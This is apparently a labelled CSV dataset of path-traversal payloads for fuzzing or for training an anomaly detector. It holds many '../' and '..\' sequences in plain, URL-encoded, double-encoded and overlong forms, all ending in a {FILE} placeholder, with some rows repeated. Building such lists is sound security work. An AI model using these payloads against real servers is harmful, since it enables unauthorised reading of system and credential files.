payload,length,attack_type,label
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},153,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},174,path-traversal,anom
..%%35%63{FILE},15,path-traversal,anom
..%%35%63..%%35%63{FILE},24,path-traversal,anom
..%%35%63..%%35%63..%%35%63{FILE},33,path-traversal,anom
..%%35%63..%%35%63..%%35%63..%%35%63{FILE},42,path-traversal,anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},51,path-traversal,anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},60,path-traversal,anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},69,path-traversal,anom
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},78,path-traversal,anom
%%32%65%%32%65/{FILE},21,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/{FILE},36,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},51,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},66,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},81,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},96,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},111,path-traversal,anom
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},126,path-traversal,anom
%%32%65%%32%65%%35%63{FILE},27,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},48,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},69,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},90,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},111,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},132,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},153,path-traversal,anom
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},174,path-traversal,anom
../{FILE},9,path-traversal,anom
../../{FILE},12,path-traversal,anom
../../../{FILE},15,path-traversal,anom
../../../../{FILE},18,path-traversal,anom
../../../../../{FILE},21,path-traversal,anom
../../../../../../{FILE},24,path-traversal,anom
../../../../../../../{FILE},27,path-traversal,anom
../../../../../../../../{FILE},30,path-traversal,anom
..%2f{FILE},11,path-traversal,anom
..%2f..%2f{FILE},16,path-traversal,anom
..%2f..%2f..%2f{FILE},21,path-traversal,anom
..%2f..%2f..%2f..%2f{FILE},26,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f{FILE},31,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},36,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},41,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},46,path-traversal,anom
%2e%2e/{FILE},13,path-traversal,anom
%2e%2e/%2e%2e/{FILE},20,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/{FILE},27,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},34,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},41,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},48,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},55,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},62,path-traversal,anom
%2e%2e%2f{FILE},15,path-traversal,anom
%2e%2e%2f%2e%2e%2f{FILE},24,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},33,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},42,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},51,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},60,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},69,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},78,path-traversal,anom
..%252f{FILE},13,path-traversal,anom
..%252f..%252f{FILE},20,path-traversal,anom
..%252f..%252f..%252f{FILE},27,path-traversal,anom
..%252f..%252f..%252f..%252f{FILE},34,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f{FILE},41,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},48,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},55,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},62,path-traversal,anom
%252e%252e/{FILE},17,path-traversal,anom
%252e%252e/%252e%252e/{FILE},28,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/{FILE},39,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},50,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},61,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},72,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},83,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},94,path-traversal,anom
%252e%252e%252f{FILE},21,path-traversal,anom
%252e%252e%252f%252e%252e%252f{FILE},36,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},51,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},66,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},81,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},96,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},111,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},126,path-traversal,anom
..\{FILE},9,path-traversal,anom
..\..\{FILE},12,path-traversal,anom
..\..\..\{FILE},15,path-traversal,anom
..\..\..\..\{FILE},18,path-traversal,anom
..\..\..\..\..\{FILE},21,path-traversal,anom
..\..\..\..\..\..\{FILE},24,path-traversal,anom
..\..\..\..\..\..\..\{FILE},27,path-traversal,anom
..\..\..\..\..\..\..\..\{FILE},30,path-traversal,anom
..%5c{FILE},11,path-traversal,anom
..%5c..%5c{FILE},16,path-traversal,anom
..%5c..%5c..%5c{FILE},21,path-traversal,anom
..%5c..%5c..%5c..%5c{FILE},26,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c{FILE},31,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},36,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},41,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},46,path-traversal,anom
%2e%2e\{FILE},13,path-traversal,anom
%2e%2e\%2e%2e\{FILE},20,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\{FILE},27,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},34,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},41,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},48,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},55,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},62,path-traversal,anom
%2e%2e%5c{FILE},15,path-traversal,anom
%2e%2e%5c%2e%2e%5c{FILE},24,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},33,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},42,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},51,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},60,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},69,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},78,path-traversal,anom
..%255c{FILE},13,path-traversal,anom
..%255c..%255c{FILE},20,path-traversal,anom
..%255c..%255c..%255c{FILE},27,path-traversal,anom
..%255c..%255c..%255c..%255c{FILE},34,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c{FILE},41,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},48,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},55,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},62,path-traversal,anom
%252e%252e\{FILE},17,path-traversal,anom
%252e%252e\%252e%252e\{FILE},28,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\{FILE},39,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},50,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},61,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},72,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},83,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},94,path-traversal,anom
%252e%252e%255c{FILE},21,path-traversal,anom
%252e%252e%255c%252e%252e%255c{FILE},36,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},51,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},66,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},81,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},96,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},111,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},126,path-traversal,anom
../{FILE},9,path-traversal,anom
../../{FILE},12,path-traversal,anom
../../../{FILE},15,path-traversal,anom
../../../../{FILE},18,path-traversal,anom
../../../../../{FILE},21,path-traversal,anom
../../../../../../{FILE},24,path-traversal,anom
../../../../../../../{FILE},27,path-traversal,anom
../../../../../../../../{FILE},30,path-traversal,anom
..%2f{FILE},11,path-traversal,anom
..%2f..%2f{FILE},16,path-traversal,anom
..%2f..%2f..%2f{FILE},21,path-traversal,anom
..%2f..%2f..%2f..%2f{FILE},26,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f{FILE},31,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},36,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},41,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},46,path-traversal,anom
%2e%2e/{FILE},13,path-traversal,anom
%2e%2e/%2e%2e/{FILE},20,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/{FILE},27,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},34,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},41,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},48,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},55,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},62,path-traversal,anom
%2e%2e%2f{FILE},15,path-traversal,anom
%2e%2e%2f%2e%2e%2f{FILE},24,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},33,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},42,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},51,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},60,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},69,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},78,path-traversal,anom
..%252f{FILE},13,path-traversal,anom
..%252f..%252f{FILE},20,path-traversal,anom
..%252f..%252f..%252f{FILE},27,path-traversal,anom
..%252f..%252f..%252f..%252f{FILE},34,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f{FILE},41,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},48,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},55,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},62,path-traversal,anom
%252e%252e/{FILE},17,path-traversal,anom
%252e%252e/%252e%252e/{FILE},28,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/{FILE},39,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},50,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},61,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},72,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},83,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},94,path-traversal,anom
%252e%252e%252f{FILE},21,path-traversal,anom
%252e%252e%252f%252e%252e%252f{FILE},36,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},51,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},66,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},81,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},96,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},111,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},126,path-traversal,anom
..\{FILE},9,path-traversal,anom
..\..\{FILE},12,path-traversal,anom
..\..\..\{FILE},15,path-traversal,anom
..\..\..\..\{FILE},18,path-traversal,anom
..\..\..\..\..\{FILE},21,path-traversal,anom
..\..\..\..\..\..\{FILE},24,path-traversal,anom
..\..\..\..\..\..\..\{FILE},27,path-traversal,anom
..\..\..\..\..\..\..\..\{FILE},30,path-traversal,anom
..%5c{FILE},11,path-traversal,anom
..%5c..%5c{FILE},16,path-traversal,anom
..%5c..%5c..%5c{FILE},21,path-traversal,anom
..%5c..%5c..%5c..%5c{FILE},26,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c{FILE},31,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},36,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},41,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},46,path-traversal,anom
%2e%2e\{FILE},13,path-traversal,anom
%2e%2e\%2e%2e\{FILE},20,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\{FILE},27,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},34,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},41,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},48,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},55,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},62,path-traversal,anom
%2e%2e%5c{FILE},15,path-traversal,anom
%2e%2e%5c%2e%2e%5c{FILE},24,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},33,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},42,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},51,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},60,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},69,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},78,path-traversal,anom
..%255c{FILE},13,path-traversal,anom
..%255c..%255c{FILE},20,path-traversal,anom
..%255c..%255c..%255c{FILE},27,path-traversal,anom
..%255c..%255c..%255c..%255c{FILE},34,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c{FILE},41,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},48,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},55,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},62,path-traversal,anom
%252e%252e\{FILE},17,path-traversal,anom
%252e%252e\%252e%252e\{FILE},28,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\{FILE},39,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},50,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},61,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},72,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},83,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},94,path-traversal,anom
%252e%252e%255c{FILE},21,path-traversal,anom
%252e%252e%255c%252e%252e%255c{FILE},36,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},51,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},66,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},81,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},96,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},111,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},126,path-traversal,anom
\../{FILE},10,path-traversal,anom
\../\../{FILE},14,path-traversal,anom
\../\../\../{FILE},18,path-traversal,anom
\../\../\../\../{FILE},22,path-traversal,anom
\../\../\../\../\../{FILE},26,path-traversal,anom
\../\../\../\../\../\../{FILE},30,path-traversal,anom
\../\../\../\../\../\../\../{FILE},34,path-traversal,anom
\../\../\../\../\../\../\../\../{FILE},38,path-traversal,anom
/..\{FILE},10,path-traversal,anom
/..\/..\{FILE},14,path-traversal,anom
/..\/..\/..\{FILE},18,path-traversal,anom
/..\/..\/..\/..\{FILE},22,path-traversal,anom
/..\/..\/..\/..\/..\{FILE},26,path-traversal,anom
/..\/..\/..\/..\/..\/..\{FILE},30,path-traversal,anom
/..\/..\/..\/..\/..\/..\/..\{FILE},34,path-traversal,anom
/..\/..\/..\/..\/..\/..\/..\/..\{FILE},38,path-traversal,anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE},1036,path-traversal,anom
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},1039,path-traversal,anom
